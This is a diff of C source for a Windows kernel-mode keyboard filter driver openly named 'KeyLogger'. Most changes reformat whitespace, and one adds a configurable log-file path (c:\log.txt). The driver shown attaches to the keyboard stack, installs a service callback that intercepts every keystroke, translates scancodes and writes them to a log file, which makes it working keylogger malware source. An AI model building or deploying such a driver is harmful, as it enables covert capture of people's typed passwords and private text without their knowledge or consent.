@@ -5,15 +5,19 @@
 #pragma alloc_text (PAGE, KeyLogger_EvtIoInternalDeviceControl)
 #endif
 
-HANDLE				fileHandle;		// Handle for the log file. Remains open throughout the driver's lifetime.
+HANDLE			fileHandle;			// Handle for the log file. Remains open throughout the driver's lifetime.
 
-KEYBOARD_DATA_ARRAY 		keyboardDataArray;	// Structure that holds the global array.
+KEYBOARD_DATA_ARRAY 	keyboardDataArray;		// Structure that holds the global array.
 
-ULONG				written;		// Total number of records written to the file.
+ULONG			written;			// Total number of records written to the file.
 
-#define				LOG_TRIGGER_POINT 16	// Value at which the writing work item fires.
+// Configuration
+#define			LOG_TRIGGER_POINT 16		// Value at which the writing work item fires.
 
-#define				SZ_KEYTABLE 0x59	// Size of the scancodes table.
+#define			LOG_FILE_PATH "c:\\log.txt"	// Path to the log file. Path should exists (not tested)
+// End of configuration
+
+#define			SZ_KEYTABLE 0x59		// Size of the scancodes table below.
 
 char* keytable[SZ_KEYTABLE] =				// Scancodes table.
 {
@@ -239,7 +243,7 @@ OpenLogFile
 	//
 	// Initialize file name
 	//
-	RtlInitUnicodeString(&fileName, L"\\DosDevices\\c:\\log.txt");
+	RtlInitUnicodeString(&fileName, L"\\DosDevices\\"LOG_FILE_PATH);
 
 	//
 	// Initialize file attributes
@@ -644,8 +648,8 @@ Exit:
 
 NTSTATUS
 DriverEntry(
-    IN PDRIVER_OBJECT  DriverObject,
-    IN PUNICODE_STRING RegistryPath
+	IN PDRIVER_OBJECT  DriverObject,
+	IN PUNICODE_STRING RegistryPath
 )
 /**
  *
@@ -659,7 +663,7 @@ DriverEntry(
  *
  *		PUNICODE_STRING RegistryPath
  *			Pointer to a unicode string representing the path,
- *           to driver-specific key in the registry.
+ *			to driver-specific key in the registry.
  *
  * Return Value:
  *
@@ -667,39 +671,39 @@ DriverEntry(
  *
  **/
 {
-    WDF_DRIVER_CONFIG               config;
-    NTSTATUS                        status;
+	WDF_DRIVER_CONFIG		config;
+	NTSTATUS			status;
 
-    DebugPrint(("KeyLogger KMDF Driver.\n"));
-    DebugPrint(("Built %s %s\n", __DATE__, __TIME__));
+	DebugPrint(("KeyLogger KMDF Driver.\n"));
+	DebugPrint(("Built %s %s\n", __DATE__, __TIME__));
 
-    //
-    // Initiialize driver config.
 	//
-    WDF_DRIVER_CONFIG_INIT(
-        &config,
-        KeyLogger_EvtDeviceAdd
-    );
+	// Initiialize driver config.
+	//
+	WDF_DRIVER_CONFIG_INIT(
+		&config,
+		KeyLogger_EvtDeviceAdd
+	);
 
 	//
 	// Specify driver's Unload function.
 	//
 	//config.EvtDriverUnload = DriverUnload;
 
-    //
-    // Create a framework driver object.
-    //
-    status = WdfDriverCreate(
+	//
+	// Create a framework driver object.
+	//
+	status = WdfDriverCreate(
 	DriverObject,
-        RegistryPath,
-        WDF_NO_OBJECT_ATTRIBUTES,
-        &config,
-        WDF_NO_HANDLE
-    );
+		RegistryPath,
+		WDF_NO_OBJECT_ATTRIBUTES,
+		&config,
+		WDF_NO_HANDLE
+	);
 
-    if (!NT_SUCCESS(status))
+	if (!NT_SUCCESS(status))
 	{
-        DebugPrint(("WdfDriverCreate failed with status 0x%x\n",
+		DebugPrint(("WdfDriverCreate failed with status 0x%x\n",
 			status));
 	}
 	
@@ -708,8 +712,8 @@ DriverEntry(
 
 NTSTATUS
 KeyLogger_EvtDeviceAdd(
-    IN WDFDRIVER        Driver,
-    IN PWDFDEVICE_INIT  DeviceInit
+	IN WDFDRIVER        Driver,
+	IN PWDFDEVICE_INIT  DeviceInit
 )
 /**
  * 
@@ -718,85 +722,85 @@ KeyLogger_EvtDeviceAdd(
  *
  **/
 {
-    WDF_OBJECT_ATTRIBUTES   deviceAttributes;
-    NTSTATUS                status;
-    WDFDEVICE               hDevice;
-    PDEVICE_EXTENSION       filterExt;
-    WDF_IO_QUEUE_CONFIG     ioQueueConfig;
+	WDF_OBJECT_ATTRIBUTES	deviceAttributes;
+	NTSTATUS		status;
+	WDFDEVICE		hDevice;
+	PDEVICE_EXTENSION	filterExt;
+	WDF_IO_QUEUE_CONFIG	ioQueueConfig;
 
-    UNREFERENCED_PARAMETER(Driver);
+	UNREFERENCED_PARAMETER(Driver);
 
-    PAGED_CODE();
+	PAGED_CODE();
 
-    //
-    // Tell the framework that you are filter driver. Framework
-    // takes care of inherting all the device flags & characterstics
-    // from the lower device you are attaching to.
-    //
-    WdfFdoInitSetFilter(DeviceInit);
+	//
+	// Tell the framework that you are filter driver. Framework
+	// takes care of inherting all the device flags & characterstics
+	// from the lower device you are attaching to.
+	//
+	WdfFdoInitSetFilter(DeviceInit);
 
-    WdfDeviceInitSetDeviceType(
+	WdfDeviceInitSetDeviceType(
 		DeviceInit,
 		FILE_DEVICE_KEYBOARD
 	);
 
-    WDF_OBJECT_ATTRIBUTES_INIT_CONTEXT_TYPE(
+	WDF_OBJECT_ATTRIBUTES_INIT_CONTEXT_TYPE(
 		&deviceAttributes,
 		DEVICE_EXTENSION
 	);
 
-    //
-    // Create a framework device object.
 	//
-    status = WdfDeviceCreate(
+	// Create a framework device object.
+	//
+	status = WdfDeviceCreate(
 		&DeviceInit,
 		&deviceAttributes,
 		&hDevice
 	);
 
-    if (!NT_SUCCESS(status))
+	if (!NT_SUCCESS(status))
 	{
-        DebugPrint(("WdfDeviceCreate failed with status code 0x%x\n",
+		DebugPrint(("WdfDeviceCreate failed with status code 0x%x\n",
 			status));
-        return status;
-    }
+		return status;
+	}
 
 	//
 	// Get device extension data.
 	//
-    filterExt = GetDeviceExtension(hDevice);
+	filterExt = GetDeviceExtension(hDevice);
 
-    //
-    // Configure the default queue to be Parallel. Do not use sequential queue
-    // if this driver is going to be filtering PS2 ports because it can lead to
-    // deadlock. The PS2 port driver sends a request to the top of the stack when it
-    // receives an ioctl request and waits for it to be completed. If you use a
-    // a sequential queue, this request will be stuck in the queue because of the 
-    // outstanding ioctl request sent earlier to the port driver.
-    //
-    WDF_IO_QUEUE_CONFIG_INIT_DEFAULT_QUEUE(
+	//
+	// Configure the default queue to be Parallel. Do not use sequential queue
+	// if this driver is going to be filtering PS2 ports because it can lead to
+	// deadlock. The PS2 port driver sends a request to the top of the stack when it
+	// receives an ioctl request and waits for it to be completed. If you use a
+	// a sequential queue, this request will be stuck in the queue because of the 
+	// outstanding ioctl request sent earlier to the port driver.
+	//
+	WDF_IO_QUEUE_CONFIG_INIT_DEFAULT_QUEUE(
 	&ioQueueConfig,
-        WdfIoQueueDispatchParallel
-    );
+		WdfIoQueueDispatchParallel
+	);
 
-    //
-    // Framework by default creates non-power managed queues for
-    // filter drivers.
-    //
-    ioQueueConfig.EvtIoInternalDeviceControl = KeyLogger_EvtIoInternalDeviceControl;
+	//
+	// Framework by default creates non-power managed queues for
+	// filter drivers.
+	//
+	ioQueueConfig.EvtIoInternalDeviceControl = KeyLogger_EvtIoInternalDeviceControl;
 
-    status = WdfIoQueueCreate(
+	status = WdfIoQueueCreate(
 	hDevice,
-        &ioQueueConfig,
-        WDF_NO_OBJECT_ATTRIBUTES,
-        WDF_NO_HANDLE
-    );
+		&ioQueueConfig,
+		WDF_NO_OBJECT_ATTRIBUTES,
+		WDF_NO_HANDLE
+	);
 
-    if (!NT_SUCCESS(status))
+	if (!NT_SUCCESS(status))
 	{
-        DebugPrint( ("WdfIoQueueCreate failed 0x%x\n", status));
-        return status;
-    }
+		DebugPrint( ("WdfIoQueueCreate failed 0x%x\n", status));
+		return status;
+	}
 
 	//
 	// Create work item.
@@ -820,17 +824,17 @@ KeyLogger_EvtDeviceAdd(
 	//
 	written = 0;
 
-    return status;
+	return status;
 }
 
 
 VOID
 KeyLogger_EvtIoInternalDeviceControl(
-    IN WDFQUEUE      Queue,
-    IN WDFREQUEST    Request,
-    IN size_t        OutputBufferLength,
-    IN size_t        InputBufferLength,
-    IN ULONG         IoControlCode
+	IN WDFQUEUE	Queue,
+	IN WDFREQUEST	Request,
+	IN size_t	OutputBufferLength,
+	IN size_t	InputBufferLength,
+	IN ULONG	IoControlCode
 )
 /**
  *
@@ -838,127 +842,129 @@ KeyLogger_EvtIoInternalDeviceControl(
  * 
  **/
 {
-    PDEVICE_EXTENSION               devExt;
-    PINTERNAL_I8042_HOOK_KEYBOARD   hookKeyboard = NULL;
-    PCONNECT_DATA                   connectData = NULL;
-    NTSTATUS                        status = STATUS_SUCCESS;
-    size_t                          length;
-    WDFDEVICE                       hDevice;
-    BOOLEAN                         ret = TRUE;
-    WDF_REQUEST_SEND_OPTIONS        options;
+	PDEVICE_EXTENSION		devExt;
+	PINTERNAL_I8042_HOOK_KEYBOARD	hookKeyboard = NULL;
+	PCONNECT_DATA			connectData = NULL;
+	NTSTATUS			status = STATUS_SUCCESS;
+	size_t				length;
+	WDFDEVICE			hDevice;
+	BOOLEAN				ret = TRUE;
+	WDF_REQUEST_SEND_OPTIONS	options;
 
-    UNREFERENCED_PARAMETER(OutputBufferLength);
-    UNREFERENCED_PARAMETER(InputBufferLength);
+	UNREFERENCED_PARAMETER(OutputBufferLength);
+	UNREFERENCED_PARAMETER(InputBufferLength);
 	UNREFERENCED_PARAMETER(hookKeyboard);
 
-    PAGED_CODE();
+	PAGED_CODE();
 
 
-    hDevice = WdfIoQueueGetDevice(Queue);
-    devExt = GetDeviceExtension(hDevice);
+	hDevice = WdfIoQueueGetDevice(Queue);
+	devExt = GetDeviceExtension(hDevice);
 
-    switch (IoControlCode)
+	switch (IoControlCode)
 	{
 	//
-    // Connect a keyboard class device driver to the port driver.
-    //
-    case IOCTL_INTERNAL_KEYBOARD_CONNECT:
-        //
-        // Only allow one connection.
-        //
-        if (devExt->UpperConnectData.ClassService != NULL) {
-            status = STATUS_SHARING_VIOLATION;
-            break;
-        }
+	// Connect a keyboard class device driver to the port driver.
+	//
+	case IOCTL_INTERNAL_KEYBOARD_CONNECT:
+		//
+		// Only allow one connection.
+		//
+		if (devExt->UpperConnectData.ClassService != NULL) {
+			status = STATUS_SHARING_VIOLATION;
+			break;
+		}
 
-        //
-        // Get the input buffer from the request
-        // (Parameters.DeviceIoControl.Type3InputBuffer).
-        //
-        status = WdfRequestRetrieveInputBuffer(Request,
-                                    sizeof(CONNECT_DATA),
-                                    &connectData,
-                                    &length);
-        if(!NT_SUCCESS(status)){
-            DebugPrint(("WdfRequestRetrieveInputBuffer failed %x\n", status));
-            break;
-        }
+		//
+		// Get the input buffer from the request
+		// (Parameters.DeviceIoControl.Type3InputBuffer).
+		//
+		status = WdfRequestRetrieveInputBuffer(
+			Request,
+			sizeof(CONNECT_DATA),
+			&connectData,
+			&length
+		);
+		if(!NT_SUCCESS(status)){
+			DebugPrint(("WdfRequestRetrieveInputBuffer failed %x\n", status));
+			break;
+		}
 
-        NT_ASSERT(length == InputBufferLength);
+		NT_ASSERT(length == InputBufferLength);
 
-        devExt->UpperConnectData = *connectData;
+		devExt->UpperConnectData = *connectData;
 
-        //
-        // Hook into the report chain.  Everytime a keyboard packet is reported
-        // to the system, KbFilter_ServiceCallback will be called
-        //
+		//
+		// Hook into the report chain.  Everytime a keyboard packet is reported
+		// to the system, KbFilter_ServiceCallback will be called
+		//
 
-        connectData->ClassDeviceObject = WdfDeviceWdmGetDeviceObject(hDevice);
+		connectData->ClassDeviceObject = WdfDeviceWdmGetDeviceObject(hDevice);
 
 #pragma warning(disable:4152)  //nonstandard extension, function/data pointer conversion
 
-        connectData->ClassService = KeyLogger_ServiceCallback;
+		connectData->ClassService = KeyLogger_ServiceCallback;
 
 #pragma warning(default:4152)
 
-        break;
+		break;
 
-    //
-    // Disconnect a keyboard class device driver from the port driver.
-    //
-    case IOCTL_INTERNAL_KEYBOARD_DISCONNECT:
+	//
+	// Disconnect a keyboard class device driver from the port driver.
+	//
+	case IOCTL_INTERNAL_KEYBOARD_DISCONNECT:
 
-        //
-        // Clear the connection parameters in the device extension.
-        //
-        // devExt->UpperConnectData.ClassDeviceObject = NULL;
-        // devExt->UpperConnectData.ClassService = NULL;
+		//
+		// Clear the connection parameters in the device extension.
+		//
+		// devExt->UpperConnectData.ClassDeviceObject = NULL;
+		// devExt->UpperConnectData.ClassService = NULL;
 
-        status = STATUS_NOT_IMPLEMENTED;
-        break;
+		status = STATUS_NOT_IMPLEMENTED;
+		break;
 
-    //
-    // Might want to capture these in the future.  For now, then pass them down
-    // the stack.  These queries must be successful for the RIT to communicate
-    // with the keyboard.
-    //
-    case IOCTL_KEYBOARD_QUERY_INDICATOR_TRANSLATION:
-    case IOCTL_KEYBOARD_QUERY_INDICATORS:
-    case IOCTL_KEYBOARD_SET_INDICATORS:
-    case IOCTL_KEYBOARD_QUERY_TYPEMATIC:
-    case IOCTL_KEYBOARD_SET_TYPEMATIC:
-        break;
-    }
+	//
+	// Might want to capture these in the future.  For now, then pass them down
+	// the stack.  These queries must be successful for the RIT to communicate
+	// with the keyboard.
+	//
+	case IOCTL_KEYBOARD_QUERY_INDICATOR_TRANSLATION:
+	case IOCTL_KEYBOARD_QUERY_INDICATORS:
+	case IOCTL_KEYBOARD_SET_INDICATORS:
+	case IOCTL_KEYBOARD_QUERY_TYPEMATIC:
+	case IOCTL_KEYBOARD_SET_TYPEMATIC:
+		break;
+	}
 
-    if (!NT_SUCCESS(status))
+	if (!NT_SUCCESS(status))
 	{
-        WdfRequestComplete(Request, status);
-        return;
-    }
+		WdfRequestComplete(Request, status);
+		return;
+	}
 
-    //
-    // We are not interested in post processing the IRP so 
-    // fire and forget.
-    //
-    WDF_REQUEST_SEND_OPTIONS_INIT(&options,
-                                    WDF_REQUEST_SEND_OPTION_SEND_AND_FORGET);
+	//
+	// We are not interested in post processing the IRP so 
+	// fire and forget.
+	//
+	WDF_REQUEST_SEND_OPTIONS_INIT(&options,
+									WDF_REQUEST_SEND_OPTION_SEND_AND_FORGET);
 
-    ret = WdfRequestSend(Request, WdfDeviceGetIoTarget(hDevice), &options);
+	ret = WdfRequestSend(Request, WdfDeviceGetIoTarget(hDevice), &options);
 
-    if (ret == FALSE)
+	if (ret == FALSE)
 	{
-        status = WdfRequestGetStatus (Request);
-        DebugPrint(("WdfRequestSend failed: 0x%x\n", status));
-        WdfRequestComplete(Request, status);
-    }
+		status = WdfRequestGetStatus (Request);
+		DebugPrint(("WdfRequestSend failed: 0x%x\n", status));
+		WdfRequestComplete(Request, status);
+	}
 }
 
 VOID
 KeyLogger_ServiceCallback(
-    IN PDEVICE_OBJECT		DeviceObject,
-    IN PKEYBOARD_INPUT_DATA 	InputDataStart,
-    IN PKEYBOARD_INPUT_DATA 	InputDataEnd,
-    IN OUT PULONG		InputDataConsumed
+	IN PDEVICE_OBJECT		DeviceObject,
+	IN PKEYBOARD_INPUT_DATA 	InputDataStart,
+	IN PKEYBOARD_INPUT_DATA 	InputDataEnd,
+	IN OUT PULONG		InputDataConsumed
 )
 /**
  *
@@ -969,15 +975,15 @@ KeyLogger_ServiceCallback(
  *
  **/
 {
-    PDEVICE_EXTENSION   devExt;
-    WDFDEVICE		hDevice;
+	PDEVICE_EXTENSION	devExt;
+	WDFDEVICE		hDevice;
 
-    hDevice = WdfWdmDeviceGetWdfDeviceHandle(DeviceObject);
+	hDevice = WdfWdmDeviceGetWdfDeviceHandle(DeviceObject);
 
 	//
 	// Get the Device Extension.
 	//
-    devExt = GetDeviceExtension(hDevice);
+	devExt = GetDeviceExtension(hDevice);
 
 	ULONG			totalKeys;
 	PKEYBOARD_INPUT_DATA	inputKey;
@@ -1031,11 +1037,11 @@ KeyLogger_ServiceCallback(
 		}
 	}
 
-    (*(PSERVICE_CALLBACK_ROUTINE)(ULONG_PTR) devExt->UpperConnectData.ClassService)(
-        devExt->UpperConnectData.ClassDeviceObject,
-        InputDataStart,
-        InputDataEnd,
-        InputDataConsumed);
+	(*(PSERVICE_CALLBACK_ROUTINE)(ULONG_PTR) devExt->UpperConnectData.ClassService)(
+		devExt->UpperConnectData.ClassDeviceObject,
+		InputDataStart,
+		InputDataEnd,
+		InputDataConsumed);
 }
 
 VOID
